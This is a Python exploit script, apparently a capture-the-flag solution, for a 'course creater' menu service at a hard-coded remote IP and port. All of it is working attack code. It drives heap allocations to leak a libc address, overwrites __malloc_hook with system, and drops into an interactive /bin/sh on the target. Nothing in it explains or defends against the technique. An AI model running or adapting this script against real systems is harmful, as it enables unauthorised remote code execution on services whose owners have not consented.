#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#course creater

#host = "10.211.55.16"
#port = 8888

host = "149.13.33.84"
port = 1520

sock = make_conn(host,port)

def addteacher(sock,num,name,age,note = None):
    recvuntil(sock,">>")
    sendline(sock,"1")
    recvuntil(sock,">>")
    sendline(sock,str(num))
    if num < 0 :
        return 
    for i in range(num):
        recvuntil(sock,">>")
        sendline(sock,name)
        recvuntil(sock,">>")
        sendline(sock,str(age))
        recvuntil(sock,">>")
        if note :
            sendline(sock,"y")
            recvuntil(sock,">>")
            sendline(sock,note)
        else :
            sendline(sock,"n")

def addcourse(sock,title,ids,summary,length,desc,first = 0):
    recvuntil(sock,">>")
    sendline(sock,"2")
    if not first :
        recvuntil(sock,">>")
        sendline(sock,"n")
        recvuntil(sock,">>")
        sendline(sock,str(length))
        recvuntil(sock,">>")
        sendline(sock,desc)
        return 
    recvuntil(sock,">>")
    sendline(sock,title)
    recvuntil(sock,">>")
    sendline(sock,str(ids))
    recvuntil(sock,">>")
    sendline(sock,summary)
    recvuntil(sock,">>")
    sendline(sock,str(length))
    recvuntil(sock,">>")
    sendline(sock,desc)

def editteacher(sock,index,name,age,note = None):
    recvuntil(sock,">>")
    sendline(sock,"4")
    recvuntil(sock,">>")
    sendline(sock,str(index))
    recvuntil(sock,">>")
    sendline(sock,name)
    recvuntil(sock,">>")
    sendline(sock,str(age))
    recvuntil(sock,">>")
    if note :
        sendline(sock,"y")
        recvuntil(sock,">>")
        sendline(sock,note)
    else :
        sendline(sock,"n")

def listteacher(sock,index):
    recvuntil(sock,">>")
    sendline(sock,"3")
    recvuntil(sock,">>")
    sendline(sock,str(index))
    return recvuntil(sock,"Quit")


puts_off = 0x64c10
addteacher(sock,0,"ggwp",11)
addcourse(sock,"a"*0x80,1,"b"*0x80,131000,"m"*0x100,1)
for i in range(126):
    print i
    addcourse(sock,"c"*0x80,1,"d"*0x80,131000,"MEH")

addcourse(sock,"g"*0x80,1,"h"*0x80,121500,"b"*0x300)
addcourse(sock,"g"*0x80,1,"h"*0x80,120,"g"*16 + pack32(0x0804afd4) + "z"*88)
for i in range(13):
    print i
    addcourse(sock,"g"*0x80,1,"\x04"*0x80,120,"a"*100)
addcourse(sock,"g"*0x80,1,"h"*0x80,132000,"b"*0x10)
data = listteacher(sock,12)
match = re.search("Name:.*",data)
libc =  unpack32(match.group()[6:10].ljust(4,"\x00")) - puts_off
assert(libc & 0xfff == 0)

addcourse(sock,"g"*0x80,1,"h"*0x80,0x7fffffff,"z")
addcourse(sock,"g"*0x80,1,"h"*0x80,0x65000000,"z")
addcourse(sock,"g"*0x80,1,"h"*0x80,0x7500000,"z")
addcourse(sock,"g"*0x80,1,"h"*0x80,0x1000000,"z")
addcourse(sock,"g"*0x80,1,"h"*0x80,0x7000000,"z")
addteacher(sock,1,"/bin/sh",993737531,"/bin/sh")
addteacher(sock,-3,"gg",1)

print "overwite"
recvuntil(sock,">>")
sendline(sock,"2")
recvuntil(sock,">>")
sendline(sock,"y")
recvuntil(sock,">>")
sendline(sock,"a")
recvuntil(sock,">>")
sendline(sock,"-1")
recvuntil(sock,">>")
recvuntil(sock,">>")
sendline(sock,"1")
recvuntil(sock,">>")
sendline(sock,"nogg")

malloc_hook = libc + 0x1a7408
system = libc + 0x3fcd0
sh = libc + 0x15da84

print "fake"
#fake
recvuntil(sock,">>")
sendline(sock,"2")
recvuntil(sock,">>")
sendline(sock,"y")
recvuntil(sock,">>")
sendline(sock,"a"*72 + pack32(malloc_hook))
recvuntil(sock,">>")
sendline(sock,"1")
recvuntil(sock,">>")
sendline(sock,"1")
recvuntil(sock,">>")
sendline(sock,"1")
recvuntil(sock,">>")
sendline(sock,"nogg")



editteacher(sock,65,pack32(system),1)

print "libc",hex(libc)

#pass arg for system
recvuntil(sock,">>")
sendline(sock,"2")
recvuntil(sock,">>")
sendline(sock,"n")
recvuntil(sock,">>")
sendline(sock,str(0x47010))

inter(sock)
